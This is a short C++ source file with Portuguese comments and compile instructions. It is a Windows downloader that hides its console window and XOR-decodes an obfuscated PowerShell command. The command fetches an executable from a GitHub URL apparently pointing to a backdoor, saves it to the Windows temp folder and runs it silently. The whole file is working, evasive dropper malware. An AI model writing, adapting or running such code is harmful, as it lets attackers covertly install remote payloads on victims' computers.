// Autor: Andrey Querino
//
// Compilação linux g++/i686-w64-mingw32-g++ <arquivo>.cpp -o <arquivo>.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-processos -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
// Compilação windows g++ -std=c++11 <arquivo>.cpp -o <arquivo>.exe -s -lws2_32 -Wno-write-processos -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

#include <windows.h> //necessário para chamar outros processos, iniciar outros cabeçalhos e chamadas 
#pragma comment(lib, "Ws2_32.lib") //informar o compilador para compilar estaticamente esta biblioteca no executável. Sem isso, nosso executável não funcionará em nenhuma máquina, a menos que tenha o Microsoft Visual C / C ++ redistribuível instalado em seu sistema

// Função Criptografia Xor
void Decrypter(char CriptXor[]) {  
    int QuantidadeString = strlen(CriptXor); // Determina o tamanho da string.
    for (int i = 0; i < QuantidadeString; i++){ 
        CriptXor[i] = CriptXor[i] ^ (QuantidadeString*2/100); // A chave da criptografia é o tamanho da string * 2 / 100.
    } 
} 

void Run() {
   char processo[] = "sltfqpkfoo-f{f#tdfw#kwwsp9,,djwkva-`ln,bmgqfzrvfqjml,Ab`hgllq.Jmgfwf`wbufo,aola,nbjm,NqRvfqjml-f{f<qbt>wqvf#.l#@9__tjmgltp__wfns__Tfo@lnf-f{f8pwbqw#@9__tjmgltp__wfns__Tfo@lnf-f{f";
   Decrypter(processo);
   STARTUPINFO pinfo; //contém detalhes de como todas as coisas devem ser cuidadas antes do início do processo 
   PROCESS_INFORMATION info; //contém detalhes sobre o novo processo, processo pai, seu processo filho, outros threads e como ele funcionará 
   memset(&pinfo, 0, sizeof(pinfo));
   CreateProcess(NULL, processo, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &pinfo, &info); //API CreateProcess que cria um processo powershell.exe usando a variável acima e canaliza a entrada, saída e erro para o HANDLE usando o & info criado acima
}

int main() {
    FreeConsole(); //função para desativar a janela do console de modo que não seja visível para o usuário
    Run();
    return 0;
}
